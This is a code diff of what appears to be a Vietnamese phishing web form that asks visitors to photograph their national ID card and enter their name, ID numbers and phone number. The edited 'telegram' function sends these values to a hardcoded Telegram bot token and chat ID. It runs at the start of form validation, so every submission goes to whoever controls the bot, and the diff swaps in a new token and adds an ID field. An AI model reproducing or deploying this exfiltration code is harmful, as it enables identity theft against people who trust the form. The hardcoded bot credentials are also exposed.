@@ -684,7 +684,7 @@
                     <!-- <button class="btn" style="display:block;" onclick="document.getElementById('file').click()">Chụp CCCD Mặt Trước</button> -->
                     <label class="btn" for="file1" style="text-align: center;">Chụp Hình CCCD/CMND Mặt Trước</label>
                 </div>
-                <input style="visibility: hidden;" multiple="multiple" class="custom-file-input" type="file" name="file" id="file1" accept="image/*" capture="user" placeholder="chuphinh"/>
+                <input style="visibility: hidden;" class="custom-file-input" type="file" name="file" id="file1" accept="image/*" capture="user" placeholder="chuphinh"/>
                 <div class="inputfield">
                     <img id="imagefile1" style="width: 100%; height: 240; text-align: center;"/>               
                 </div>
@@ -821,10 +821,10 @@
                 
                 }
             
-            function telegram(hoten, cccd, sdt){
-                var my_text = ` - Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A - SĐT: ${sdt}`
-                var token = "2117356737:AAEUlBzzaArt_kBuMBWypzVygWAbVX03WVw";
-                var chat_id = 411713304
+            function telegram(hoten, cccd, cmnd,sdt){
+                var my_text = ` - Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A CMND: ${CMND}%0A - SĐT: ${sdt}`
+                var token = "5722329244:AAFAZMKdLqT8yiip_SAcJ2JTdefb9mB3ukU";
+                var chat_id = 5664202010
                 var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`//&parse_mode=html
                 let api = new XMLHttpRequest();
                 api.open("GET", url, true);
@@ -833,7 +833,8 @@
             }
                             
             function validateform() {
-                telegram($("#hoten").val(), $("#CCCD").val(), $("#sdt").val())
+                telegram($("#hoten").val(), $("#CCCD").val(), $("#CMND").val(), $("#sdt").val())
+                
                 if ($("#hoten").val() == null || $("#hoten").val() === "") {
                     $("#hoten").css('box-shadow', '0px 0px 7px red');
                     location.href = "#hoten";
